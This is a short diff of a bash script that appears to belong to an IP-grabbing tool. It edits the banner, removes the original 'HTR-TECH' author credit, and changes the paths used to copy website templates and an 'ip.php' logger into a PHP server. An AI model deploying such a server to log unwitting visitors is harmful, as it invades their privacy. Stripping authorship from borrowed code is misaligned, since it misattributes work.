@@ -113,7 +113,7 @@ check_status() {
 banner() {
 	cat <<- EOF
 		${ORANGE}  █ █▀█ ▄▄ █▀▀ █▀▀ ▀█▀                  
-		${ORANGE}  █ █▀▀ ░░ █▄█ ██▄ ░█░   ${CYAN}Version {RED}:{YELLOW}${__version__}
+		${ORANGE}  █ █▀▀ ░░ █▄█ ██▄ ░█░   ${CYAN}Version :${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by TAN × RIKTA ${WHITE}
 	EOF
@@ -249,7 +249,7 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE} Tan Vai ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Author   ${RED}:  ${ORANGE} Tan Vai ${RED}[ ${ORANGE}${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Tan-vai
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
@@ -302,8 +302,8 @@ cusport() {
 ## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
+	cp -rf sites/"$website"/* .server/www
+	cp -f sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
